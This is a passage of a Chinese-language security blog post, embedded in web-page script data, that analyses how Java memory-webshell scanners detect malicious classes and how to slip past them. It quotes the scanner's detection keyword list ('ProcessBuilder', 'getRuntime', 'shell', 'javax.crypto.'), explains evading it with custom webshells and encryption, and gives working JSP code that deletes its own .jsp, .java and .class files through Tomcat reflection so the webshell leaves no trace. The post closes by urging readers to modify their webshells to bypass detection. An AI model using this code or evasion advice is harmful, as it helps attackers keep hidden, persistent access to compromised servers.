class=\"hljs-keyword\"\u003Enew\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-built_in\"\u003EArrayList\u003C\u002Fspan\u003E&#x3C;\u003Cspan class=\"hljs-type\"\u003EString\u003C\u002Fspan\u003E\u003E();\n        riskAnnotations.\u003Cspan class=\"hljs-built_in\"\u003Eadd\u003C\u002Fspan\u003E(\u003Cspan class=\"hljs-string\"\u003E\"org.springframework.stereotype.Controller\"\u003C\u002Fspan\u003E);\n      riskAnnotations.\u003Cspan class=\"hljs-built_in\"\u003Eadd\u003C\u002Fspan\u003E(\u003Cspan class=\"hljs-string\"\u003E\"org.springframework.web.bind.annotation.RestController\"\u003C\u002Fspan\u003E);      riskAnnotations.\u003Cspan class=\"hljs-built_in\"\u003Eadd\u003C\u002Fspan\u003E(\u003Cspan class=\"hljs-string\"\u003E\"org.springframework.web.bind.annotation.RequestMapping\"\u003C\u002Fspan\u003E);\n        riskAnnotations.\u003Cspan class=\"hljs-built_in\"\u003Eadd\u003C\u002Fspan\u003E(\u003Cspan class=\"hljs-string\"\u003E\"org.springframework.web.bind.annotation.GetMapping\"\u003C\u002Fspan\u003E);\n        riskAnnotations.\u003Cspan class=\"hljs-built_in\"\u003Eadd\u003C\u002Fspan\u003E(\u003Cspan class=\"hljs-string\"\u003E\"org.springframework.web.bind.annotation.PostMapping\"\u003C\u002Fspan\u003E);\n        riskAnnotations.\u003Cspan class=\"hljs-built_in\"\u003Eadd\u003C\u002Fspan\u003E(\u003Cspan class=\"hljs-string\"\u003E\"org.springframework.web.bind.annotation.PatchMapping\"\u003C\u002Fspan\u003E);\n        riskAnnotations.\u003Cspan class=\"hljs-built_in\"\u003Eadd\u003C\u002Fspan\u003E(\u003Cspan class=\"hljs-string\"\u003E\"org.springframework.web.bind.annotation.PutMapping\"\u003C\u002Fspan\u003E);\n        riskAnnotations.\u003Cspan class=\"hljs-built_in\"\u003Eadd\u003C\u002Fspan\u003E(\u003Cspan class=\"hljs-string\"\u003E\"org.springframework.web.bind.annotation.Mapping\"\u003C\u002Fspan\u003E);\n    ...\n\u003Cspan class=\"copy-code-btn\"\u003E复制代码\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E下面代码完成主要的检测逻辑，首先会检测包名和SpringMVC注解的类，检测到则添加到\u003Ccode\u003EresultClasses\u003C\u002Fcode\u003E中，并且修改\u003Ccode\u003Enot_found\u003C\u002Fcode\u003E标志位为False，表示不检测\u003Ccode\u003EServelt\u002FFilter\u002FListener\u003C\u002Fcode\u003E类型的shell。\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"hljs language-scss copyable\" lang=\"scss\"\u003E\u003Cspan class=\"hljs-built_in\"\u003Efor\u003C\u002Fspan\u003E(Class&#x3C;?\u003E clazz: loadedClasses){\n                Class&#x3C;?\u003E target = clazz;\n                boolean not_found = true;\n      \u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F检测包名是否为恶意包名，如果是则设置not_found为false，代表已经被shell连接过了，跳过后面Servlet和Filter内存马部分的检测并Dump出恶意类的信息。\u003C\u002Fspan\u003E\n                \u003Cspan class=\"hljs-built_in\"\u003Efor\u003C\u002Fspan\u003E(String packageName: riskPackage){\n                    \u003Cspan class=\"hljs-built_in\"\u003Eif\u003C\u002Fspan\u003E(clazz.getName()\u003Cspan class=\"hljs-selector-class\"\u003E.startsWith\u003C\u002Fspan\u003E(packageName)){\n                        resultClasses\u003Cspan class=\"hljs-selector-class\"\u003E.add\u003C\u002Fspan\u003E(clazz);\n                        not_found = false;\n                        ClassUtils\u003Cspan class=\"hljs-selector-class\"\u003E.dumpClass\u003C\u002Fspan\u003E(ins, clazz.getName(), false, Integer\u003Cspan class=\"hljs-selector-class\"\u003E.toHexString\u003C\u002Fspan\u003E(target.getClassLoader()\u003Cspan class=\"hljs-selector-class\"\u003E.hashCode\u003C\u002Fspan\u003E()));\n                        break;\n                    }\n                }\n    \u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F判断是否使用SpringMVC的注解注册Controller，如果是则Dump出使用注解的Controller的类的信息\u003C\u002Fspan\u003E\n                \u003Cspan class=\"hljs-built_in\"\u003Eif\u003C\u002Fspan\u003E(ClassUtils.isUseAnnotations(clazz, riskAnnotations)){\n                    resultClasses\u003Cspan class=\"hljs-selector-class\"\u003E.add\u003C\u002Fspan\u003E(clazz);\n                    not_found = false;\n                    ClassUtils\u003Cspan class=\"hljs-selector-class\"\u003E.dumpClass\u003C\u002Fspan\u003E(ins, clazz.getName(), false, Integer\u003Cspan class=\"hljs-selector-class\"\u003E.toHexString\u003C\u002Fspan\u003E(target.getClassLoader()\u003Cspan class=\"hljs-selector-class\"\u003E.hashCode\u003C\u002Fspan\u003E()));\n                }\n      \u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F检测Servelt\u002FFilter\u002FListener类型Webshell\u003C\u002Fspan\u003E\n      \u003Cspan class=\"hljs-built_in\"\u003Eif\u003C\u002Fspan\u003E(not_found){\n                    \u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F 递归查找\u003C\u002Fspan\u003E\n                    while (target != null &#x26;&#x26; !target.getName()\u003Cspan class=\"hljs-selector-class\"\u003E.equals\u003C\u002Fspan\u003E(\"java.lang.Object\")){\n                        \u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F 每次都重新获得目标类实现的所有接口\u003C\u002Fspan\u003E\n                        interfaces = new ArrayList&#x3C;String\u003E();\n                        \u003Cspan class=\"hljs-built_in\"\u003Efor\u003C\u002Fspan\u003E(Class&#x3C;?\u003E cls: target.getInterfaces()){\n                            interfaces\u003Cspan class=\"hljs-selector-class\"\u003E.add\u003C\u002Fspan\u003E(cls.getName());\n                        }\n                        \u003Cspan class=\"hljs-built_in\"\u003Eif\u003C\u002Fspan\u003E( \u002F\u002F 继承危险父类的目标类\n                                (target.getSuperclass() != null &#x26;&#x26; riskSuperClassesName\u003Cspan class=\"hljs-selector-class\"\u003E.contains\u003C\u002Fspan\u003E(target.getSuperclass()\u003Cspan class=\"hljs-selector-class\"\u003E.getName\u003C\u002Fspan\u003E())) ||\n                                        \u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F 实现特殊接口的目标类\u003C\u002Fspan\u003E\n                                        target\u003Cspan class=\"hljs-selector-class\"\u003E.getName\u003C\u002Fspan\u003E()\u003Cspan class=\"hljs-selector-class\"\u003E.equals\u003C\u002Fspan\u003E(\"org.springframework.web.servlet.handler.AbstractHandlerMapping\") ||\n                                        interfaces\u003Cspan class=\"hljs-selector-class\"\u003E.contains\u003C\u002Fspan\u003E(\"javax.servlet.Filter\") ||\n                                        interfaces\u003Cspan class=\"hljs-selector-class\"\u003E.contains\u003C\u002Fspan\u003E(\"javax.servlet.Servlet\") ||\n                                        interfaces\u003Cspan class=\"hljs-selector-class\"\u003E.contains\u003C\u002Fspan\u003E(\"javax.servlet.ServletRequestListener\")\n                        )\n                        {\n     ...\n                            \u003Cspan class=\"hljs-built_in\"\u003Eif\u003C\u002Fspan\u003E(loadedClassesNames.contains(clazz.getName())){\n                                resultClasses\u003Cspan class=\"hljs-selector-class\"\u003E.add\u003C\u002Fspan\u003E(clazz);\n                                ClassUtils\u003Cspan class=\"hljs-selector-class\"\u003E.dumpClass\u003C\u002Fspan\u003E(ins, clazz.getName(), false, Integer\u003Cspan class=\"hljs-selector-class\"\u003E.toHexString\u003C\u002Fspan\u003E(clazz.getClassLoader()\u003Cspan class=\"hljs-selector-class\"\u003E.hashCode\u003C\u002Fspan\u003E()));\n                            }else{\n                               ...\n                            }\n                            break;\n                        }\n                        target = target\u003Cspan class=\"hljs-selector-class\"\u003E.getSuperclass\u003C\u002Fspan\u003E();\n                    }\n                }\n\u003Cspan class=\"copy-code-btn\"\u003E复制代码\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E我们主要关注\u003Ccode\u003EServlet\u003C\u002Fcode\u003E的检测，首先获取当前Class的实现接口，如果Class的父类不为空并且父类不是\u003Ccode\u003EHttpServlet\u003C\u002Fcode\u003E，并且没有实现\u003Ccode\u003ESerlvet\\Filter\\ServletRequestListener\u003C\u002Fcode\u003E等接口则不会被添加到\u003Ccode\u003EresultClasses\u003C\u002Fcode\u003E但会递归的去检查父类。由于JSP文件实际继承了\u003Ccode\u003EHttpJspBase\u003C\u002Fcode\u003E，相当于间接继承了\u003Ccode\u003EHttpServlet\u003C\u002Fcode\u003E，所以是绕不过这里的检查的，不过没关系，这一步只是检查是否是Servlet，并不代表被检测出来了。\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"hljs language-scss copyable\" lang=\"scss\"\u003Ewhile (target != null &#x26;&#x26; !target.getName()\u003Cspan class=\"hljs-selector-class\"\u003E.equals\u003C\u002Fspan\u003E(\"java.lang.Object\")){\n                        \u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F 每次都重新获得目标类实现的所有接口\u003C\u002Fspan\u003E\n                        interfaces = new ArrayList&#x3C;String\u003E();\n                        \u003Cspan class=\"hljs-built_in\"\u003Efor\u003C\u002Fspan\u003E(Class&#x3C;?\u003E cls: target.getInterfaces()){\n                            interfaces\u003Cspan class=\"hljs-selector-class\"\u003E.add\u003C\u002Fspan\u003E(cls.getName());\n                        }\n                        \u003Cspan class=\"hljs-built_in\"\u003Eif\u003C\u002Fspan\u003E( \u002F\u002F 继承危险父类的目标类\n                                (target.getSuperclass() != null &#x26;&#x26; riskSuperClassesName\u003Cspan class=\"hljs-selector-class\"\u003E.contains\u003C\u002Fspan\u003E(target.getSuperclass()\u003Cspan class=\"hljs-selector-class\"\u003E.getName\u003C\u002Fspan\u003E())) ||\n                                        \u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F 实现特殊接口的目标类\u003C\u002Fspan\u003E\n                                        target\u003Cspan class=\"hljs-selector-class\"\u003E.getName\u003C\u002Fspan\u003E()\u003Cspan class=\"hljs-selector-class\"\u003E.equals\u003C\u002Fspan\u003E(\"org.springframework.web.servlet.handler.AbstractHandlerMapping\") ||interfaces\u003Cspan class=\"hljs-selector-class\"\u003E.contains\u003C\u002Fspan\u003E(\"javax.servlet.Filter\") ||interfaces\u003Cspan class=\"hljs-selector-class\"\u003E.contains\u003C\u002Fspan\u003E(\"javax.servlet.Servlet\") ||interfaces\u003Cspan class=\"hljs-selector-class\"\u003E.contains\u003C\u002Fspan\u003E(\"javax.servlet.ServletRequestListener\")\n                        )\n                        {\n                            \u003Cspan class=\"hljs-built_in\"\u003Eif\u003C\u002Fspan\u003E(loadedClassesNames.contains(clazz.getName())){\n                                resultClasses\u003Cspan class=\"hljs-selector-class\"\u003E.add\u003C\u002Fspan\u003E(clazz);\n                                ClassUtils\u003Cspan class=\"hljs-selector-class\"\u003E.dumpClass\u003C\u002Fspan\u003E(ins, clazz.getName(), false, Integer\u003Cspan class=\"hljs-selector-class\"\u003E.toHexString\u003C\u002Fspan\u003E(clazz.getClassLoader()\u003Cspan class=\"hljs-selector-class\"\u003E.hashCode\u003C\u002Fspan\u003E()));\n                            }else{\n                                LogUtils\u003Cspan class=\"hljs-selector-class\"\u003E.logit\u003C\u002Fspan\u003E(\"cannot find \" + clazz.getName() + \" classes in instrumentation\");\n                            }\n                            break;\n                      ...\n                        }\n                        target = target\u003Cspan class=\"hljs-selector-class\"\u003E.getSuperclass\u003C\u002Fspan\u003E();\n                    }\n\u003Cspan class=\"copy-code-btn\"\u003E复制代码\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E下面是判断是否为恶意内容的核心，只有当\u003Ccode\u003EresultClasses\u003C\u002Fcode\u003E中包含了关键下面的关键字才会被标记为high，这里如果我们使用自定义马的话也是可以绕过的，但是如果要使用冰蝎,一定会被\u003Ccode\u003Ejavax.crypto.\u003C\u002Fcode\u003E加密包的规则检测到，如果是自定义加密算法也是可以绕过的。\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"hljs language-ini copyable\" lang=\"ini\"\u003EList&#x3C;String\u003E \u003Cspan class=\"hljs-attr\"\u003EriskKeyword\u003C\u002Fspan\u003E = new ArrayList&#x3C;String\u003E()\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n        riskKeyword.add(\"javax.crypto.\")\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n        riskKeyword.add(\"ProcessBuilder\")\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n        riskKeyword.add(\"getRuntime\")\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n        riskKeyword.add(\"shell\")\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n...\n        for(Class&#x3C;?\u003E clazz: resultClasses){\n            File \u003Cspan class=\"hljs-attr\"\u003EdumpPath\u003C\u002Fspan\u003E = PathUtils.getStorePath(clazz, \u003Cspan class=\"hljs-literal\"\u003Efalse\u003C\u002Fspan\u003E)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n            String \u003Cspan class=\"hljs-attr\"\u003Elevel\u003C\u002Fspan\u003E = \u003Cspan class=\"hljs-string\"\u003E\"normal\"\u003C\u002Fspan\u003E\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n            String \u003Cspan class=\"hljs-attr\"\u003Econtent\u003C\u002Fspan\u003E = PathUtils.getFileContent(dumpPath)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n            for(String keyword: riskKeyword){\n                if(content.contains(keyword)){\n                    \u003Cspan class=\"hljs-attr\"\u003Elevel\u003C\u002Fspan\u003E = \u003Cspan class=\"hljs-string\"\u003E\"high\"\u003C\u002Fspan\u003E\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n                    break\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n                }\n            }\n\u003Cspan class=\"copy-code-btn\"\u003E复制代码\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Ch2 data-id=\"heading-10\"\u003E自删除\u003C\u002Fh2\u003E\n\u003Cp\u003E上面只是分析了如何让我们的JSP在删除了\u003Ccode\u003EJSP\\java\\Class\u003C\u002Fcode\u003E文件后还能访问，下面我们分析如何在\u003Ccode\u003EJSP\u003C\u002Fcode\u003E中实现删除\u003Ccode\u003EJSP\\java\\Class\u003C\u002Fcode\u003E文件，在\u003Ccode\u003EJspCompilationContext\u003C\u002Fcode\u003E保存着JSP编译的上下文信息，我们可以从中拿到\u003Ccode\u003Ejava\u002Fclass\u003C\u002Fcode\u003E的绝对路径。\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Ca href=\"https:\u002F\u002Flink.juejin.cn?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttp%253A%252F%252Fyx.seclover.com%252Fviews%252Fupload%252F38b4688e2d8311ecb823fa163e8ef7b7.png\" target=\"_blank\" rel=\"nofollow noopener noreferrer\" title=\"https:\u002F\u002Fwww.oschina.net\u002Faction\u002FGoToLink?url=http%3A%2F%2Fyx.seclover.com%2Fviews%2Fupload%2F38b4688e2d8311ecb823fa163e8ef7b7.png\" ref=\"nofollow noopener noreferrer\"\u003E\u003Cimg src=\"\" alt=\"\" loading=\"lazy\"\u003E\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E而\u003Ccode\u003EJspCompilationContext\u003C\u002Fcode\u003E对象保存在\u003Ccode\u003EJspServletWrapper\u003C\u002Fcode\u003E中，所以要先获取\u003Ccode\u003EJspServletWrapper\u003C\u002Fcode\u003E。\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"hljs language-arduino copyable\" lang=\"arduino\"\u003E\u003Cspan class=\"hljs-function\"\u003E\u003Cspan class=\"hljs-keyword\"\u003Epublic\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-title\"\u003EJspServletWrapper\u003C\u002Fspan\u003E\u003Cspan class=\"hljs-params\"\u003E(ServletConfig config, Options options,\n            \u003Cspan class=\"hljs-type\"\u003EString\u003C\u002Fspan\u003E jspUri, JspRuntimeContext rctxt)\u003C\u002Fspan\u003E \u003C\u002Fspan\u003E{\n        ...\n        ctxt = \u003Cspan class=\"hljs-keyword\"\u003Enew\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-built_in\"\u003EJspCompilationContext\u003C\u002Fspan\u003E(jspUri, options,\n                                         config.\u003Cspan class=\"hljs-built_in\"\u003EgetServletContext\u003C\u002Fspan\u003E(),\n                                         \u003Cspan class=\"hljs-keyword\"\u003Ethis\u003C\u002Fspan\u003E, rctxt);\n    }\n\u003Cspan class=\"copy-code-btn\"\u003E复制代码\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Ccode\u003Erequest.request.getMappingData().wrapper.instance.rctxt.jsps.get(\"\u002Fjsp.jsp\")\u003C\u002Fcode\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Ca href=\"https:\u002F\u002Flink.juejin.cn?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttp%253A%252F%252Fyx.seclover.com%252Fviews%252Fupload%252F38a585802d8311ecb823fa163e8ef7b7.png\" target=\"_blank\" rel=\"nofollow noopener noreferrer\" title=\"https:\u002F\u002Fwww.oschina.net\u002Faction\u002FGoToLink?url=http%3A%2F%2Fyx.seclover.com%2Fviews%2Fupload%2F38a585802d8311ecb823fa163e8ef7b7.png\" ref=\"nofollow noopener noreferrer\"\u003E\u003Cimg src=\"\" alt=\"\" loading=\"lazy\"\u003E\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E下面是代码实现\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"hljs language-ini copyable\" lang=\"ini\"\u003E&#x3C;%\n    \u002F\u002F从request对象中获取request属性\n    Field \u003Cspan class=\"hljs-attr\"\u003ErequestF\u003C\u002Fspan\u003E = request.getClass().getDeclaredField(\u003Cspan class=\"hljs-string\"\u003E\"request\"\u003C\u002Fspan\u003E)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    requestF.setAccessible(true)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    Request \u003Cspan class=\"hljs-attr\"\u003Ereq\u003C\u002Fspan\u003E = (Request) requestF.get(request)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    \u002F\u002F获取MappingData\n    MappingData \u003Cspan class=\"hljs-attr\"\u003EmappingData\u003C\u002Fspan\u003E = req.getMappingData()\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    \u002F\u002F获取Wrapper，这里的Wrapper是StandrardWrapper\n    Field \u003Cspan class=\"hljs-attr\"\u003EwrapperF\u003C\u002Fspan\u003E = mappingData.getClass().getDeclaredField(\u003Cspan class=\"hljs-string\"\u003E\"wrapper\"\u003C\u002Fspan\u003E)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    wrapperF.setAccessible(true)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    Wrapper \u003Cspan class=\"hljs-attr\"\u003Ewrapper\u003C\u002Fspan\u003E = (Wrapper) wrapperF.get(mappingData)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    \u002F\u002F获取jspServlet对象\n    Field \u003Cspan class=\"hljs-attr\"\u003EinstanceF\u003C\u002Fspan\u003E = wrapper.getClass().getDeclaredField(\u003Cspan class=\"hljs-string\"\u003E\"instance\"\u003C\u002Fspan\u003E)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    instanceF.setAccessible(true)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    Servlet \u003Cspan class=\"hljs-attr\"\u003EjspServlet\u003C\u002Fspan\u003E = (Servlet) instanceF.get(wrapper)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    \u002F\u002F获取rctxt属性\n    Field \u003Cspan class=\"hljs-attr\"\u003Erctxt\u003C\u002Fspan\u003E = jspServlet.getClass().getDeclaredField(\u003Cspan class=\"hljs-string\"\u003E\"rctxt\"\u003C\u002Fspan\u003E)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    rctxt.setAccessible(true)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    JspRuntimeContext \u003Cspan class=\"hljs-attr\"\u003EjspRuntimeContext\u003C\u002Fspan\u003E = (JspRuntimeContext) rctxt.get(jspServlet)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    \u002F\u002F获取jsps属性内容\n    Field \u003Cspan class=\"hljs-attr\"\u003EjspsF\u003C\u002Fspan\u003E = jspRuntimeContext.getClass().getDeclaredField(\u003Cspan class=\"hljs-string\"\u003E\"jsps\"\u003C\u002Fspan\u003E)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    jspsF.setAccessible(true)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    ConcurrentHashMap \u003Cspan class=\"hljs-attr\"\u003Ejsps\u003C\u002Fspan\u003E = (ConcurrentHashMap) jspsF.get(jspRuntimeContext)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    \u002F\u002F获取对应的JspServletWrapper\n    JspServletWrapper \u003Cspan class=\"hljs-attr\"\u003Ejsw\u003C\u002Fspan\u003E = (JspServletWrapper)jsps.get(request.getServletPath())\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    \u002F\u002F获取ctxt属性保存的JspCompilationContext对象\n    Field \u003Cspan class=\"hljs-attr\"\u003Ectxt\u003C\u002Fspan\u003E = jsw.getClass().getDeclaredField(\u003Cspan class=\"hljs-string\"\u003E\"ctxt\"\u003C\u002Fspan\u003E)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    ctxt.setAccessible(true)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    JspCompilationContext \u003Cspan class=\"hljs-attr\"\u003EjspCompContext\u003C\u002Fspan\u003E = (JspCompilationContext) ctxt.get(jsw)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    File targetFile\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    \u003Cspan class=\"hljs-attr\"\u003EtargetFile\u003C\u002Fspan\u003E = new File(jspCompContext.getClassFileName())\u003Cspan class=\"hljs-comment\"\u003E;\u002F\u002F删掉jsp的.class\u003C\u002Fspan\u003E\n    targetFile.delete()\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    \u003Cspan class=\"hljs-attr\"\u003EtargetFile\u003C\u002Fspan\u003E = new File(jspCompContext.getServletJavaFileName())\u003Cspan class=\"hljs-comment\"\u003E;\u002F\u002F删掉jsp的java文件\u003C\u002Fspan\u003E\n    targetFile.delete()\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    \u002F\u002F删除JSP文件\n    String \u003Cspan class=\"hljs-attr\"\u003E__jspName\u003C\u002Fspan\u003E = this.getClass().getSimpleName().replaceAll(\u003Cspan class=\"hljs-string\"\u003E\"_\"\u003C\u002Fspan\u003E, \u003Cspan class=\"hljs-string\"\u003E\".\"\u003C\u002Fspan\u003E)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    String \u003Cspan class=\"hljs-attr\"\u003Epath\u003C\u002Fspan\u003E=application.getRealPath(__jspName)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    File \u003Cspan class=\"hljs-attr\"\u003Efile\u003C\u002Fspan\u003E = new File(path)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    file.delete()\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n%\u003E\n\u003Cspan class=\"copy-code-btn\"\u003E复制代码\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E最后有个不兼容的小BUG，tomcat7和8\u002F9的\u003Ccode\u003EMappingData\u003C\u002Fcode\u003E类包名发生了变化\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"hljs language-ini copyable\" lang=\"ini\"\u003Etomcat7:&#x3C;%@ page \u003Cspan class=\"hljs-attr\"\u003Eimport\u003C\u002Fspan\u003E=\u003Cspan class=\"hljs-string\"\u003E\"org.apache.tomcat.util.http.mapper.MappingData\"\u003C\u002Fspan\u003E %\u003E\ntomcat8\u002F9:&#x3C;%@ page \u003Cspan class=\"hljs-attr\"\u003Eimport\u003C\u002Fspan\u003E=\u003Cspan class=\"hljs-string\"\u003E\"org.apache.catalina.mapper.MappingData\"\u003C\u002Fspan\u003E %\u003E\n\u003Cspan class=\"copy-code-btn\"\u003E复制代码\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Ca href=\"https:\u002F\u002Flink.juejin.cn?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttps%253A%252F%252Fxz.aliyun.com%252Ft%252F10372\" target=\"_blank\" rel=\"nofollow noopener noreferrer\" title=\"https:\u002F\u002Fwww.oschina.net\u002Faction\u002FGoToLink?url=https%3A%2F%2Fxz.aliyun.com%2Ft%2F10372\" ref=\"nofollow noopener noreferrer\"\u003E参考文献\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Ch2 data-id=\"heading-11\"\u003E总结\u003C\u002Fh2\u003E\n\u003Cp\u003E虽然不能使用冰蝎等webshell绕过这两款工具的检测，但是当我们了解了查杀原理，将自己的webshell稍微改一下，也是可以绕过的\u003C\u002Fp\u003E",showSidebar:a,actionType:{FETCH:"view\u002Fcolumn\u002FFETCH",FETCH_CACHED_HTML:"view\u002Fcolumn\u002FFETCH_CACHED_HTML",FETCH_ADDITIONAL:"view\u002Fcolumn\u002FFETCH_ADDITIONAL",FETCH_SIDEBAR_ADENTRY:"view\u002Fcolumn\u002FFETCH_SIDEBAR_ADENTRY",FETCH_AUTHOR_EXTRA:"view\u002Fcolumn\u002FFETCH_AUTHOR_EXTRA",RESET:"view\u002Fcolumn\u002FRESET"},recommendedArticleList:{list:[],cursor:f,loading:a,skeleton:a,hasMore:a,articleId:e,actionType:{UPDATE_STATE:"view\u002Fcolumn\u002Frecommend-List\u002FUPDATE_STATE",FETCH_MORE:"view\u002Fcolumn\u002Frecommend-List\u002FFETCH_MORE",FETCH:"view\u002Fcolumn\u002Frecommend-List\u002FFETCH",RESET:"view\u002Fcolumn\u002Frecommend-List\u002FRESET"}}},collection:{collection:{author:{}},actionType:{FETCH:"@\u002Fview\u002Fcollection\u002FFETCH",REFRESH:"@\u002Fview\u002Fcollection\u002FREFRESH",RESET:"@\u002Fview\u002Fcollection\u002FRESET"},list:{pageSize:h,page:g,total:d,pointer:c,lastPointer:c,list:[],loading:a,error:c,canPrev:b,canNext:b,linkList:[],lastFetchOnServer:a,actionType:{UPDATE:"@\u002Fview\u002Fcollection\u002Flist\u002FUPDATE",FETCH:"@\u002Fview\u002Fcollection\u002Flist\u002FFETCH",FORCE_FETCH:"@\u002Fview\u002Fcollection\u002Flist\u002FFORCE_FETCH",FETCH_MORE:"@\u002Fview\u002Fcollection\u002Flist\u002FFETCH_MORE",RESET:"@\u002Fview\u002Fcollection\u002Flist\u002FRESET"},id:e,sort:m}},gettingStarted:{category:{},actionType:{UPDATE_STATE:"@\u002Fview\u002FgettingStarted\u002FUPDATE_STATE",FOLLOW:"@\u002Fview\u002FgettingStarted\u002FFOLLOW",RESET:"@\u002Fview\u002FgettingStarted\u002FRESET",UPDATE_CATEGORY:"@\u002Fview\u002FgettingStarted\u002FUPDATE_CATEGORY"}},pin:{pin:{user:{},imageUrlList:[]},pinList:[],actionType:{FETCH:"@\u002Fview\u002Fpin\u002FFETCH",RESET:"@\u002Fview\u002Fpin\u002FRESET"},sidebar:{list:[],after:e,loading:a,isRecommend:a,hasNextPage:b,actionType:{UPDATE_STATE:"@\u002Fview\u002Fpin\u002Fsidebar\u002FUPDATE_STATE",FETCH_MORE:"@\u002Fview\u002Fpin\u002Fsidebar\u002FFETCH_MORE",FETCH:"@\u002Fview\u002Fpin\u002Fsidebar\u002FFETCH",RESET:"@\u002Fview\u002Fpin\u002Fsidebar\u002FRESET"}},commentList:{pageSize:h,page:g,total:d,pointer:c,lastPointer:c,list:[],loading:a,error:c,canPrev:b,canNext:b,linkList:[],lastFetchOnServer:a,actionType:{UPDATE:"@\u002Fview\u002Fpin\u002FcommentList\u002FUPDATE",FETCH:"@\u002Fview\u002Fpin\u002FcommentList\u002FFETCH",FORCE_FETCH:"@\u002Fview\u002Fpin\u002FcommentList\u002FFORCE_FETCH",FETCH_MORE:"@\u002Fview\u002Fpin\u002FcommentList\u002FFETCH_MORE",RESET:"@\u002Fview\u002Fpin\u002FcommentList\u002FRESET"},pinId:c},subCommentList:{pageSize:h,page:g,total:d,pointer:c,lastPointer:c,list:[],loading:a,error:c,canPrev:b,canNext:b,linkList:[],lastFetchOnServer:a,actionType:{UPDATE:"@\u002Fview\u002Fpin\u002FsubCommentList\u002FUPDATE",FETCH:"@\u002Fview\u002Fpin\u002FsubCommentList\u002FFETCH",FOR